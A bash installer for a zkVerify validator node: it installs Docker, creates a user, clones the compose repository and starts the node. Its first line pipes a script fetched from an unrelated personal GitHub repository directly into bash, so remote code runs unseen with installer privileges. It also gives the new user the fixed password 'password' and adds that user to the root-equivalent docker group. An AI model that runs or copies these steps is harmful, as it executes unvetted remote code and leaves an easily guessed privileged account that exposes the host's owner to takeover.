#!/bin/bash

set -e

# Run an external script
curl -s https://raw.githubusercontent.com/zidanaetrna/unichain/refs/heads/main/button_logo_script.sh | bash

# Update system and install required packages
echo "Updating system and installing dependencies..."
apt update && apt install -y docker-compose jq sed

# Check if Docker is already installed and if 'docker' command works
if ! command -v docker &>/dev/null; then
    echo "Docker not found, installing Docker..."
    # Install Docker only if it doesn't exist, skipping containerd.io to avoid conflicts
    apt install -y docker.io --no-install-recommends
else
    echo "Docker is already installed, skipping Docker installation."
fi

# Prompt user for the new username
while true; do
    echo "Please enter the username you want to create:"
    read -r NEW_USER
    # Check if the username is not empty
    if [[ -z "$NEW_USER" ]]; then
        echo "Username cannot be empty, please enter a valid username."
    else
        break
    fi
done

# Create the new user
echo "Creating user: $NEW_USER..."
useradd -m -s /bin/bash "$NEW_USER"
echo "$NEW_USER:password" | chpasswd  # Set a default password (change as needed)
usermod -aG docker "$NEW_USER"

echo "User $NEW_USER has been created and added to the Docker group."

# Switch to the new user and run commands
su - "$NEW_USER" <<EOF
echo "Cloning ZkVerify repository..."
git clone https://github.com/zkVerify/compose-zkverify-simplified.git
cd compose-zkverify-simplified

echo "Running initialization script..."
./scripts/init.sh

echo "Starting the ZkVerify node..."
./scripts/start.sh
EOF

echo "ZkVerify node setup is complete!"

# Display final instructions
echo "To check running Docker containers, use: docker container ls"
echo "To check logs, use: docker logs -f validator-node"
echo "For further steps, refer to: https://docs.zkverify.io/tutorials/how_to_run_a_node/run_using_docker/run_new_validator_node/"
